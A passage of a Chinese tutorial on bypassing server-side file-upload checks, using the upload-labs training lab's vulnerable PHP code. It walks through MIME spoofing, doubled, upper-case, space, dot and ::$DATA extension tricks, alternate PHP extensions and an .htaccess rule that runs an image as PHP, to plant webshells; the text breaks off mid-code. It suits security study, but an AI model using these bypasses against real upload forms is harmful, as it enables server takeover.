<p><img src="https://img-blog.csdnimg.cn/img_convert/629515bb5bb9640289a0275222eab0ff.png" alt="image-20240506192253074"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/51eb5675e894bcb0a3f90a72f7331349.png" alt="image-20240506192211675"></p>
<h3 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h3><p>服务端检测就是网站对用户上传的文件的检测代码放置在服务器里，当用户上传的文件通过了检测才会被允许保存在服务器里。</p>
<h4 id="MIME-类型检测"><a href="#MIME-类型检测" class="headerlink" title="MIME 类型检测"></a>MIME 类型检测</h4><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准，用来表示文档、文件或字节流的性质和格式。简单来说就是用来表示我们提交的数据的类型。</p>
<p>检测方式：通过检查 <code>http</code> 包的 <code>Content-Type</code> 字段中的值来判断上传文件是否合法。</p>
<p>一般采取白名单的方式来进行检测，如只能上传图像文件的话就 <code>Content-Type</code> 头就必须为 <code>image/jpeg</code> 或 <code>image/png</code> 或 <code>image/gif</code>。</p>
<p>在 <code>http</code> 数据包中在 <code>Content-Type</code> 字段常见值有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文本：text/plain、text/html、text/css、text/javascript、text/xml</span><br><span class="line">图片：image/gif、image/png、image/jpeg</span><br><span class="line">视频：video/webm、video/ogg</span><br><span class="line">音频：audio/midi、audio/mpeg、audio/webm、audio/ogg、audio/wav</span><br><span class="line">二进制：application/octet-stream、application/pdf、application/json</span><br><span class="line">在表单中进行文件上传：multipart/form-data</span><br></pre></td></tr></table></figure>

<p>绕过：一般来说网站的上传点是允许上传图片的，所以可以利用 <code>BurpSuite</code> 截取并修改数据包中的 <code>Content-Type</code> 字段的值为图片类型的值从而进行绕过。</p>
<h5 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h5><p>upload-labs Pass-02：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];          </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接来看关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) </span><br></pre></td></tr></table></figure>

<p><code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>：文件的 MIME 类型，需要浏览器提供该信息的支持，例如 <code>image/gif</code>。</p>
<p>那么我们对应的就要改 MIME 类型为 jpg 、 png 和 gif</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b4d79ed31bbe12461b752661d2ea4943.png" alt="image-20240506194122559"></p>
<p><del>其实直接传 jpg 、 png 和 gif 文件马然后把后缀该为 php 就可以了…</del></p>
<h4 id="文件后缀检测"><a href="#文件后缀检测" class="headerlink" title="文件后缀检测"></a>文件后缀检测</h4><h5 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h5><p>一般情况下，代码文件里会有一个数组或者列表，该数组或者列表里会包含一些非法的字符或者字符串，当数据包中含有符合该列表的字符串时，即认定该数据包是非法的。 </p>
<h6 id="如何确认是否是黑名单检测"><a href="#如何确认是否是黑名单检测" class="headerlink" title="如何确认是否是黑名单检测"></a>如何确认是否是黑名单检测</h6><p>黑名单是有限的，可以随意构造一个文件后缀，如果可以上传，则说明是黑名单检测。</p>
<h6 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h6><ul>
<li><p>后缀双写绕过：</p>
<p>有些代码中，会将文件后缀符合黑名单列表的字符串替换为空，比如将 php 替换为空，这时可以将木马命名为 webshell.pphphp，这样上传后的文件名为 webshell.php。具体命名根据文件类型和替换规则确定。</p>
<p>实例：</p>
<p>upload-labs Pass-11：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>

<p>会将 <code> $file_name</code> 中匹配到 <code> $deny_ext</code> 的字符替换为空，并且该函数不区分大小写。</p>
<p>由于该函数进行逐一查找时并不会去检查已经被查找、替换后的字符串拼接未被查找、替换后字符串是否符合替换标准，所以我们可用 <code>webshell.pphphp</code> 绕过。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d08a5113ddfbaac22d6d8b225184b30d.png" alt="image-20240508093428998"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3fa0a0b2a89ad8f2edd5c3da3df67fdd.png" alt="image-20240508093742509"></p>
</li>
<li><p>后缀大小写绕过（适用于 windows 系统）：</p>
<p>可以上传后缀为大写字母的文件，利用 windows 对大小写不敏感，来访问和执行木马。</p>
<p>upload-labs Pass-05：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br></pre></td></tr></table></figure>

<p>那么将后缀部分或全部大写都可以实现绕过：webshell.pHp、webshell.PHP … </p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c8a347bfbdaa13c42096e4ed93f5037e.png" alt="image-20240508084103906"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/daf5291a5a44ee3dcc1c94e9434e0cc7.png" alt="image-20240508084248142"></p>
</li>
<li><p>空格绕过：</p>
<p>如果没有进行去空格处理，可以在后缀之后加空格 <code>.php </code> 绕过。</p>
<p>实例：</p>
<p>upload-labs Pass-07：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 首尾去空</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/f4b255269b6c59c999166f60424e230a.png" alt="image-20240508085726925"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/576110550bdc7d8511b959dea0ad5105.png" alt="image-20240508085829772"></p>
</li>
<li><p>点绕过：</p>
<p>如果没有进行去点（ . ）处理，可以在后缀之后加点（ .php. ），利用 windows 的特点， 会自动去点后缀名最后的点，进行绕过。</p>
<p>实例 1：</p>
<p>upload-labs Pass-05：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>问题代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>

<p> <code>delot</code> 从字符串的尾部开始，从后向前删除点 <code>.</code> ，直到该字符串的末尾字符不是 <code>.</code> 为止。</p>
<p>问题就在结束的位置的判断，如果我们上传的文件后缀名为 <code>php. .</code> 那么经过代码删除后的后缀为 <code>.php. </code>，从而成功上传。</p>
<p>成功上传的文件后缀 <code>.php. </code> 也会被自动删除点 <code>.</code> 和空格 <code> </code>，变为 <code>.php</code>，被成功解析和执行。</p>
<p>注意：由于 <code>delot</code> 判断机制，在后缀保证两点一空格的前提下怎么加点和加空格都可以，比如：<code>.php. . . . .</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ecd979bd3f415335a4873f358b47436e.png" alt="image-20240507214430339"></p>
<p>连接蚁剑的话直接填上传的源地址就行，不用修改。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ff319adb7a4cf24507d0d681c4e7df2e.png" alt="image-20240507214911346"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6b09d4adfd9f8c10c20523fe07cec052.png" alt="image-20240507214847137"></p>
<p>实例 2：</p>
<p>upload-labs Pass-06：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>

<p>直接用实例 1 的 payload 就行了</p>
</li>
<li><p><code>::$DATA</code> 绕过：<br>如果没有对后缀名进行去<code>::$DATA</code>处理，利用 windows 特点（window 对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范，在最后生成文件时，字符会被自动去除），可以忽略 <code>::$DATA</code>，直接访问前面的文件名。</p>
<p>如果文件名+ <code>::$DATA</code> 会把 <code>::$DATA</code> 之后的数据当成文件流处理，不会检测后缀名，且保持 <code>::$DATA</code> 之前的文件名。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bf4000c12ca8a47b177fa1923680c716.png" alt="20210518214952407"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b8cd40c9bb3cefeeb71f9bbe48b290ab.png" alt="20210518215322209"></p>
<p>实例：</p>
<p>upload-labs Pass-09：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>那就上传 <code>webshell.php::$DATA</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/22e42767dd5a3d4e266b442e9210f500.png" alt="image-20240508091032414"></p>
<p>注意：访问上传后的文件路径时要将后缀 <code>::$DATA</code> 删去</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c9dacdf666130e577585bcb697eb4f09.png" alt="image-20240508091413882"></p>
</li>
<li><p>其它可解析后缀绕过：</p>
<p>前提是 apache 的 httpd.conf 中有如下配置代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>

<p>可解析后缀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：php2、php3、php5、phtml、pht</span><br><span class="line">ASP：asa、cer、cdx</span><br><span class="line">ASPX：ascx、ashx、asac</span><br><span class="line">JSP：jspx、jspf</span><br></pre></td></tr></table></figure>

<p>（注意：能成功上传不一定意味着该文件类型能被成功解析）</p>
<p>实例：</p>
<p>upload-labs Pass-03：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 移除字符串两侧的空白字符或其他预定义字符</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 从字符串的尾部开始，从后向前删除点.，直到该字符串的末尾字符不是.为止</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// 搜索 . 在字符串中的位置，并返回从该位置到字符串结尾的所有字符</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 移除字符串两侧的空白字符或其他预定义字符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;  </span><br><span class="line">            <span class="comment">// 最终的上传路径随机，一部分与目前时间有关，另一部分是随机数</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用黑名单不允许上传 <code>.asp</code> 、<code>.aspx</code> 、<code>.php</code> 、<code>.jsp</code> 后缀的文件</p>
<p>直接传 webshell.phtml 的木马，再访问上传后图片的地址：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fdd38d4046b38713a4cb04935becf837.png" alt="image-20240507001016059"></p>
</li>
<li><p>图片 + 配置文件绕过：</p>
<p><code>.htaccess</code> 文件，是 apache 服务器的一个配置文件，全称是 Hypertext Access（超文本入口），提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<code>.htaccess</code> 文件可以修改 apache 的配置，但仅作用于当前目录。</p>
<p><code>.htaccess</code>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;webshell.png&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>通过一个 <code>.htaccess</code> 文件调用 php 的解析器去解析一个文件名中只要包含 “webshell.png” 这个字符串的任意文件。所以无论文件名是什么样子，只要包含 “webshell.png” 这个字符串，都可以被以 php 的方式来解析。一个自定的 <code>.htaccess</code> 文件就可以以各种各样的方式去绕过很多上传验证机制。在测试时，可以首先上传这个 <code>.htaccess</code> 文件，再上传 <code>webshell.png</code> 文件。</p>
<p>上面是匹配单个文件，其实，<code>.htaccess</code> 还可以匹配一类文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sethandler application/x-httpd-php // 将该目录和子目录吓得文件都按照 php 代码解析执行</span><br><span class="line">AddType application/x-httpd-php .xx // 将 .xx 类文件按照 php 代码解析执行</span><br><span class="line">AddHandler php5-script .xx // 将 .xx类文件按照 php 代码解析执行</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<p>upload-labs Pass-04：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span 